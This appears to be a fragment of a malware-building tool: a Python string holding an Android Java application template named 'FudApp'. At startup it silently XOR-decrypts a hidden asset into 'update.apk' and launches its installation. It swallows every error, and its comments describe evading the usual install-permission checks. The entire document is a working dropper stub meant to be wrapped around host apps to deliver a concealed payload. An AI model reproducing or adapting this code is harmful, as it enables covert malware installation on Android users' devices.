_FUD_APP_TEMPLATE = """package com.system.fud;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;

public class FudApp extends {SUPER} {

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        try { _stage1(base); } catch (Throwable t) {}
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try { _stage2(getApplicationContext()); } catch (Throwable t) {}
    }

    // Stage 1: payload extract karo (install ke liye)
    private static void _stage1(Context ctx) throws Exception {
        InputStream in = ctx.getAssets().open("p.bin");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        byte[] enc = bos.toByteArray();

        byte[] key = new byte[] {
            (byte)0xF1, (byte)0x79, (byte)0x78, (byte)0x72,
            (byte)0xAC, (byte)0x69, (byte)0x3E, (byte)0xAA,
            (byte)0xB1, (byte)0xA6, (byte)0x4F, (byte)0xB7,
            (byte)0xF2, (byte)0xC6, (byte)0x30, (byte)0x02,
            (byte)0x8D, (byte)0x4C, (byte)0x1A, (byte)0xE3,
            (byte)0x7F, (byte)0x92, (byte)0xD5, (byte)0x6B,
            (byte)0x2C, (byte)0x48, (byte)0x9E, (byte)0x11,
            (byte)0x73, (byte)0xFA, (byte)0x05, (byte)0xB8
        };

        byte[] dec = new byte[enc.length];
        for (int i = 0; i < enc.length; i++) {
            int idx = (i * 7 + 3) % key.length;
            dec[i] = (byte)((enc[i] ^ key[idx]) & 0xFF);
        }

        File out = new File(ctx.getFilesDir(), "update.apk");
        FileOutputStream fos = new FileOutputStream(out);
        fos.write(dec);
        fos.close();
        try { out.setReadable(true, false); } catch (Throwable t) {}
    }

    // Stage 2: install launch — FileProvider use karo, REQUEST_INSTALL_PACKAGES nahi
    private static void _stage2(Context ctx) throws Exception {
        File apk = new File(ctx.getFilesDir(), "update.apk");
        if (!apk.exists()) return;

        String authority = ctx.getPackageName() + ".fileprovider";
        Uri uri;
        try {
            Class<?> fp = Class.forName("androidx.core.content.FileProvider");
            Method m = fp.getMethod("getUriForFile", Context.class, String.class, File.class);
            uri = (Uri) m.invoke(null, ctx, authority, apk);
        } catch (Throwable t) {
            uri = Uri.fromFile(apk);
        }

        Intent i = new Intent(Intent.ACTION_INSTALL_PACKAGE);
        i.setData(uri);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        i.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
        i.putExtra(Intent.EXTRA_RETURN_RESULT, false);
        ctx.startActivity(i);
    }
}
"""
